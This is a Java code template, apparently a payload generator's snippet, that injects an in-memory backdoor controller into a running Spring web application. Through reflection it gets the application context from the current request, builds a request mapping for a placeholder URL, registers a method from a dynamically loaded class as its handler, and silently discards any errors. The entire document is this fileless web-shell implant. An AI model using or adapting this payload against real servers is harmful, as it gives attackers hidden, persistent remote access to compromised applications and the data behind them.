try{
    Object o = Class.forName("{{{className}}}").newInstance();
    java.lang.reflect.Method m = o.getClass().getDeclaredMethod("{{{methodName}}}", new Class[]{javax.servlet.http.HttpServletRequest.class, javax.servlet.http.HttpServletResponse.class});

    org.springframework.web.context.request.ServletRequestAttributes requestAttributes = (org.springframework.web.context.request.ServletRequestAttributes) org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();
    javax.servlet.http.HttpServletRequest httpServletRequest = requestAttributes.getRequest();
    org.springframework.web.context.support.GenericWebApplicationContext webApplicationContext = (org.springframework.web.context.support.GenericWebApplicationContext) httpServletRequest.getAttribute("org.springframework.web.servlet.DispatcherServlet.THEME_SOURCE");

    org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = webApplicationContext.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);

    org.springframework.web.servlet.mvc.condition.PathPatternsRequestCondition pathPatternsRequestCondition = new org.springframework.web.servlet.mvc.condition.PathPatternsRequestCondition(new org.springframework.web.util.pattern.PathPatternParser(), new String[]{"{{{url}}}"});
    org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition requestMethodsRequestCondition = new org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition(new org.springframework.web.bind.annotation.RequestMethod[]{});
    org.springframework.web.servlet.mvc.condition.ParamsRequestCondition paramsRequestCondition = new org.springframework.web.servlet.mvc.condition.ParamsRequestCondition(new String[]{});
    org.springframework.web.servlet.mvc.condition.HeadersRequestCondition headersRequestCondition = new org.springframework.web.servlet.mvc.condition.HeadersRequestCondition(new String[]{});
    org.springframework.web.servlet.mvc.condition.ConsumesRequestCondition consumesRequestCondition = new org.springframework.web.servlet.mvc.condition.ConsumesRequestCondition(new String[]{});
    org.springframework.web.servlet.mvc.condition.ProducesRequestCondition producesRequestCondition = new org.springframework.web.servlet.mvc.condition.ProducesRequestCondition(new String[]{});
    org.springframework.web.servlet.mvc.condition.RequestConditionHolder requestConditionHolder = new org.springframework.web.servlet.mvc.condition.RequestConditionHolder(null);

    java.lang.reflect.Constructor requestMappingInfoClassDeclaredConstructor = org.springframework.web.servlet.mvc.method.RequestMappingInfo.class.getDeclaredConstructor(new Class[]{
            String.class,
            org.springframework.web.servlet.mvc.condition.PathPatternsRequestCondition.class,
            org.springframework.web.servlet.mvc.condition.PatternsRequestCondition.class,
            org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition.class,
            org.springframework.web.servlet.mvc.condition.ParamsRequestCondition.class,
            org.springframework.web.servlet.mvc.condition.HeadersRequestCondition.class,
            org.springframework.web.servlet.mvc.condition.ConsumesRequestCondition.class,
            org.springframework.web.servlet.mvc.condition.ProducesRequestCondition.class,
            org.springframework.web.servlet.mvc.condition.RequestConditionHolder.class,
            Class.forName("org.springframework.web.servlet.mvc.method.RequestMappingInfo$BuilderConfiguration")
    });
    requestMappingInfoClassDeclaredConstructor.setAccessible(true);
    org.springframework.web.servlet.mvc.method.RequestMappingInfo requestMappingInfo = requestMappingInfoClassDeclaredConstructor.newInstance(new Object[]{
            "{{{url}}}",
            pathPatternsRequestCondition,
            null,
            requestMethodsRequestCondition,
            paramsRequestCondition,
            headersRequestCondition,
            consumesRequestCondition,
            producesRequestCondition,
            requestConditionHolder,
            null
    });

    requestMappingHandlerMapping.registerMapping(requestMappingInfo, o, m);
}catch (Exception e){}